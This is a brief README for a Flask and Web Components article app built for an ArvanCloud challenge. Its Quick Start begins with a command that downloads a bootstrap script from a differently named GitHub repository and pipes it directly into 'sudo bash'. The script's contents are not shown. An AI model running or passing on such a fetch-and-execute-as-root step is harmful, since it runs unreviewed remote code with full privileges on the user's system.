# ArvanCloud Challenge – RealWorld App

Modern full-stack article platform built with **Flask + Vanilla Web Components**.

**Frontend**: Shadow DOM Web Components, custom router, zero build step
**Backend**: Flask + transparent proxy to external RealWorld API

## Quick Start

test

```bash
curl -fsSL https://raw.githubusercontent.com/mobin188/r1/main/scripts/bootstrap.sh | sudo bash
cd arvancloud-challenge

# Backend
python -m venv venv
source venv/bin/activate        # Windows: venv\Scripts\activate
pip install -r requirements.txt

# Copy environment config
cp .env.example .env
# Edit .env if you want to point to a different backend

python run.py
